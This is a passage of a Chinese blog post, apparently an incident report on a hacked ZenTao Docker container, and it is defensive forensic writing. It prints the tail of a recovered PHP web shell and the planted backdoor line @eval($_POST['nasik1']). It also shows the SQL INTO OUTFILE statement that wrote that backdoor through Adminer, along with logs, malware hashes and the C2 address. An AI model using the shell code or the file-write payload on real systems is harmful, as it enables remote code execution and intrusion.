class="variable">$io</span>[<span class="number">2</span>]))&#123;</span><br><span class="line">			<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">		@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">		@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>))&#123;</span><br><span class="line">		@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>))&#123;</span><br><span class="line">		<span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">		<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">		<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();</span><br><span class="line">		<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">		<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();</span><br><span class="line">		<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();</span><br><span class="line">		<span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>找到一个后门：<code>/apps/zentao/config/config.php</code>，权限 777,最后一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nasik1&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>执行 <code>stat config/config.php</code>，输出：</p>
+<blockquote>
+<p> File: config&#x2F;config.php<br>  Size: 16600     	Blocks: 40         IO Block: 4096   regular file<br>Device: 5eh&#x2F;94d	Inode: 2374867     Links: 1<br>Access: (0777&#x2F;-rwxrwxrwx)  Uid: (65534&#x2F;  nobody)   Gid: (65534&#x2F; nogroup)<br>Access: 2025-05-13 12:51:49.652000000 +0800<br>Modify: 2025-04-16 13:08:56.368000000 +0800<br>Change: 2025-04-16 13:08:56.368000000 +0800<br> Birth: 2025-02-19 14:01:10.416000000 +0800</p>
+</blockquote>
+<h3 id="继续漏洞分析"><a href="#继续漏洞分析" class="headerlink" title="继续漏洞分析"></a>继续漏洞分析</h3><p>这个版本的禅道自带 adminer(版本 4.8.2-dev)，这个是我到代码目录下才看见的。我找了找 adminer 的漏洞，很容易就找到一个，但是这个漏洞的利用必须得先要</p>
+<ol>
+<li>有能登录数据库的账号密码</li>
+<li>这个数据库账号还需要有 FILE 权限</li>
+</ol>
+<p>而恰好，当时跑 zentao 之后第一次安装时，数据库设置选的缺省的账号密码，本来缺省的也没事，毕竟数据库只能本地连，但 adminer 一下子又让 web 可以访问，于是，web 也就能连数据库了，再加上还是缺省账号密码，于是就能 web 登录数据库了，然后缺省账号密码权限还很高，于是直接就能写后门了。</p>
+<p>至于前面看到的 <code>/apps/zentao/config/config.php</code> 里最后的一句：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nasik1&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>都是在 adminer 中登录数据库以后，执行 sql 语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;@eval(\$_POST[&#x27;nasik1&#x27;]);&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/apps/zentao/config/config.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>生成的。</p>
+<p>在 zentao 的日志里发现了关键几句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.1 - - [15/Apr/2025:15:58:43 +0800] &quot;POST /adminer/index.php HTTP/1.0&quot; 302 - &quot;https://api-devnet.chainless.top:8002/adminer/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.0.1 - - [15/Apr/2025:15:58:44 +0800] &quot;GET /adminer/index.php?username=root&amp;db=zentao HTTP/1.0&quot; 403 4673 &quot;https://api-devnet.chainless.top:8002/adminer/index.php&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.0.1 - - [15/Apr/2025:15:58:44 +0800] &quot;GET /adminer/index.php?file=functions.js&amp;version=4.8.2-dev HTTP/1.0&quot; 200 27548 &quot;https://api-devnet.chainless.top:8002/adminer/index.php?username=root&amp;db=zentao&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;</span><br><span class="line">192.168.0.1 - - [15/Apr/2025:15:58:45 +0800] &quot;GET /adminer/index.php?file=favicon.ico&amp;version=4.8.2-dev HTTP/1.0&quot; 200 318 &quot;https://api-devnet.chainless.top:8002/adminer/index.php?username=root&amp;db=zentao&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+
+<p>由上可以看出，黑客是 <code>15/Apr/2025:15:58:44 +0800</code> 开始进来的。但是前面看 <code>/apps/zentao/config/config.php</code> 是 <code>16/Apr/2025</code> 被植入后门的。但我在那个时间没有抓到有力证据有写入 config.php 的操作。 </p>
+<h2 id="后续操作"><a href="#后续操作" class="headerlink" title="后续操作"></a>后续操作</h2><p>另外用禅道官方最新的 image <code>easysoft/zentao:21.6</code> 和之前的持久化的数据，删了些东西，重建了一个容器：zentao，publish 到 8001 端口，现在用宿主机的 内网 IP 可以访问。</p>
+<p>随后会创建网络 ACL，据掉从 192.168.0.0&#x2F;23（PVE） 到 192.168.2.0&#x2F;23（深圳办公室） 的主动访问请求。</p>
+<h3 id="异常文件分析"><a href="#异常文件分析" class="headerlink" title="异常文件分析"></a>异常文件分析</h3><p>以下为容器内 <code>/tmp</code> 目录下的关键异常文件：</p>
+<ol>
+<li><p>**<code>/tmp/phpx2lUxr</code>**：</p>
+<ul>
+<li><strong>MD5</strong>：<code>0a525dab9878c80373399c1ed0f7b8d6</code></li>
+<li><strong>创建时间</strong>：2025年4月23指的是什么？4月23日</li>
+<li><strong>分析</strong>：文件内容为base64编码字符串，解码后疑似为加密的恶意脚本或payload。由于文件过大，未直接包含在报告中。初步分析表明其可能为攻击者植入的加密后门或下载器，用于动态加载其他恶意代码。</li>
+<li><strong>作用</strong>：可能作为初始植入点或后续恶意代码的加载器。</li>
+</ul>
+</li>
+<li><p>**<code>/tmp/.1/ns</code>**：</p>
+<ul>
+<li><strong>MD5</strong>：<code>dd1c4358c778d3f1161266fa0d81e8cc</code></li>
+<li><strong>描述</strong>：位于隐藏目录 <code>/tmp/.1</code> 中，可执行二进制文件，负责C2通信。</li>
+</ul>
+</li>
+<li><p>**<code>/tmp/slix</code>**：</p>
+<ul>
+<li><strong>MD5</strong>：<code>cbd49e364bac69eb77813435e5c18365</code></li>
+<li><strong>描述</strong>：可执行文件，负责协调网络扫描和脚本执行。</li>
+</ul>
+</li>
+<li><p><strong>其他文件</strong>：</p>
+<ul>
+<li><code>/tmp/fs</code>：网络扫描工具，配合 <code>scanb.sh</code> 使用。</li>
+<li><code>/tmp/rustscan</code>：快速端口扫描工具。</li>
+<li><code>/tmp/cdk_linux_386</code>：疑似漏洞利用或恶意二进制文件。</li>
+<li><code>/tmp/.32915ant_x64.so</code>、<code>/tmp/gconv-modules</code>：可能的恶意动态库。</li>
+<li><code>/tmp/adminer.invalid</code>、<code>/tmp/adminer.version</code>：与Adminer数据库管理工具相关，暗示可能的web攻击向量。</li>
+<li><code>/tmp/CVE-2021-22555-Exploit</code>：目录名指向Linux内核提权漏洞（CVE-2021-22555），表明攻击者尝试提权。</li>
+</ul>
+</li>
+</ol>
+<h3 id="攻击者基础设施"><a href="#攻击者基础设施" class="headerlink" title="攻击者基础设施"></a>攻击者基础设施</h3><ul>
+<li><strong>IP地址</strong>：<code>176.32.35.190</code></li>
+<li><strong>归属</strong>：俄罗斯，<code>BX-NETWORK</code>（AS51659），托管商Baxet.ru，滥用联系邮箱 <code>noc@baxet.ru</code>。</li>
+<li><strong>作用</strong>：C2服务器，接收 <code>ns</code> 进程的通信，控制恶意活动。</li>
+<li><strong>证据</strong>：网络流量分析显示 <code>176.32.35.190:8024</code> 为主要外部通信目标，<code>ns</code> 进程的 <code>-vkey=82yukro912ktndfc</code> 参数表明存在身份验证机制。</li>
+</ul>
+<h3 id="入侵时间线"><a href="#入侵时间线" class="headerlink" title="入侵时间线"></a>入侵时间线</h3><ul>
+<li>**2025 年 4 月 15 日：应该就被入侵（通过 adminer 进来了）</li>
+<li><strong>2025年4月15–23日</strong>：恶意文件（<code>slix</code>、<code>ns</code>、<code>phpx2lUxr</code> 等）陆续出现，<code>slix</code> 进程最早于4月17日启动，表明入侵可能发生于4月中旬。</li>
+<li><strong>2025年4月23日</strong>：<code>ns</code> 进程启动，与C2服务器建立连接。</li>
+<li><strong>2025年5月6日</strong>：检测到PVE香港出口带宽异常，初步定位为 <code>176.32.35.190:8024</code> 的流量。</li>
+<li><strong>2025年5月7日</strong>：通过 <code>pstree -a</code> 确认容器内存在异常进程，正式确认入侵。</li>
+</ul>
+<h3 id="可能攻击向量"><a href="#可能攻击向量" class="headerlink" title="可能攻击向量"></a>可能攻击向量</h3><ul>
+<li><strong>ZenTao漏洞</strong>：<code>easysoft/zentao:21.4</code> 或其Adminer组件可能存在远程代码执行（RCE）、文件上传或其他web漏洞，导致初始访问。</li>
+<li><strong>Web暴露</strong>：容器通过PVE主机的Nginx代理暴露端口 <code>8002</code>，若未配置强认证或WAF，可能被外部直接攻击。</li>
+<li><strong>提权尝试</strong>：<code>/tmp/CVE-2021-22555-Exploit</code> 表明攻击者尝试利用Linux内核漏洞提权，但 <code>docker inspect</code> 显示容器非特权模式（<code>&quot;Privileged&quot;: false</code>），限制了提权影响。</li>
+<li><strong>用户权限</strong>：恶意进程以 <code>nobody</code> 用户运行，与ZenTao的Apache默认用户一致，暗示攻击通过web漏洞获得容器内执行权限。</li>
+</ul>
+<h2 id="事件影响"><a href="#事件影响" class="headerlink" title="事件影响"></a>事件影响</h2><ul>
+<li><strong>容器妥协</strong>：<code>zentao</code> 容器完全被入侵，运行恶意进程并与C2服务器通信。</li>
+<li><strong>网络扫描</strong>：攻击者扫描内网网段 <code>192.168.0.0/16</code> 和 <code>172.24.0.0/16</code>，可能收集了网络拓扑或其他设备信息。</li>
+<li><strong>数据泄露风险</strong>：<code>ns</code> 进程与C2服务器的通信，可能导致敏感数据（如ZenTao数据库内容）外泄或接收恶意指令。</li>
+<li><strong>主机安全</strong>：暂无证据显示PVE主机或其他虚拟机受损，但内网扫描行为增加了横向移动风险。</li>
+</ul>
+<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p><code>zentao</code> 容器于2025年4月中旬通过可能的web漏洞被入侵，攻击者植入恶意文件（<code>slix</code>、<code>ns</code>、<code>phpx2lUxr</code> 等），执行网络扫描和C2通信。入侵持续约20天，直至2025年5月6日因带宽异常暴露。应急隔离措施已生效，建议进一步分析日志、恶意文件，重建干净的ZenTao服务，并检查内网其他系统是否受影响。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat-reward.png" alt="老杨 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay-reward.png" alt="老杨 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/6fool">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/docker/" rel="tag"># docker</a>
+              <a href="/tags/zentao/" rel="tag"># zentao</a>
+              <a href="/tags/adminer/" rel="tag"># adminer</a>
+              <a href="/tags/phpx2lUxr/" rel="tag"># phpx2lUxr</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/09/something%20about%20healthcheck%20for%20Docker%20container/index.html" rel="prev" title="something about healthech for docker container">
+                  <i class="fa fa-angle-left"></i> something about healthech for docker container
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/11/centralized-logging-loki/index.html" rel="next" title="centralized logging 2 using promtail, loki">
+                  centralized logging 2 using promtail, loki <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">老杨</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
